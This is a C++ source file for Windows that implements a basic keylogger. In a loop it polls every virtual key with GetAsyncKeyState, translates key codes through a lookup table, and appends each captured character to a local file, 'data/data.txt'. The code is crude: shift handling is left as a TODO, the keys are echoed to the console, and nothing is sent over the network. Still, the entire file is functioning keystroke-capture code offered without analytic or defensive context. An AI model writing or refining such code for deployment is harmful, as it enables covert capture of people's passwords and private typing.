#include <iostream>
#include <fstream>
#include <Windows.h>
#include <tuple>

std::string filePath = "data/data.txt";

std::tuple<int, std::string> keyNames[255] = {
        { 0, "Undefined" },
    { 27, "Escape" },      // ASCII code for Escape
    { 49, "1" },           // ASCII code for '1'
    { 50, "2" },           // ASCII code for '2'
    { 51, "3" },           // ASCII code for '3'
    { 52, "4" },           // ASCII code for '4'
    { 53, "5" },           // ASCII code for '5'
    { 54, "6" },           // ASCII code for '6'
    { 55, "7" },           // ASCII code for '7'
    { 56, "8" },           // ASCII code for '8'
    { 57, "9" },           // ASCII code for '9'
    { 48, "0" },           // ASCII code for '0'
    { 189, "-" },       // ASCII code for '-'
    { 187, "=" },      // ASCII code for '='
    { 8, "\b" },           // ASCII code for Backspace
    { 9, "\t" },           // ASCII code for Tab
    { 219, "[" },            // ASCII code for '['
    { 221, "]" },             // ASCII code for ']'
    { 13, "\n" },           // ASCII code for Enter
    { 17, "LeftControl" }, // ASCII code for Left Control
    { 162, "LeftControl" }, // ASCII code for Left Control
    { 163, "RightControl" }, // ASCII code for Right Control
    {32, " "},
    {65, "a"},
    {66, "b"},
    {67, "c"},
    {68, "d"},
    {69, "e"},
    {70, "f"},
    {71, "g"},
    {72, "h"},
    {73, "i"},
    {74, "j"},
    {75, "k"},
    {76, "l"},
    {77, "m"},
    {78, "n"},
    {79, "o"},
    {80, "p"},
    {81, "q"},
    {82, "r"},
    {83, "s"},
    {84, "t"},
    {85, "u"},
    {86, "v"},
    {87, "w"},
    {88, "x"},
    {89, "y"},
    {90, "z"},
    {20, "CapsLock"},
    {18, "Alt"},
    {164, "Alt"},
    {16, "LeftShift"}
};

void RecordKey(bool bShiftDown)
{
    // TODO: handle key logs when shift down

    char ch;
    int flag = 1;

    while (flag) {
        for (int i = 8; i <= 255; ++i) {
            if (i == 16 || i == 160) continue;
            if (GetAsyncKeyState(i) & 0x8000) {
                std::cout << "Key with virtual key code " << i << " pressed" << std::endl;
                std::ofstream fout;
                fout.open(filePath, std::ios_base::app | std::ios::app);
                for (int j = 0; j <= 255; j++)
                {
                    if (i == std::get<int>(keyNames[j]))
                    {
                        std::cout << std::get<std::string>(keyNames[j]) << std::endl;
                        fout << std::get<std::string>(keyNames[j]) << "";
                        break;
                    }
                }
                fout.close();
                flag = false;
                break;
            }
        }
    }
}

bool IsShiftPressed()
{
    if (GetAsyncKeyState(16) & 0x8000) { return true; }
    return false;
}

int main()
{
    bool bShiftPressed = false;

    while (true)
    {
        bShiftPressed = IsShiftPressed();
        std::cout << bShiftPressed << std::endl;

        RecordKey(bShiftPressed);
        Sleep(112.5);
    }
}
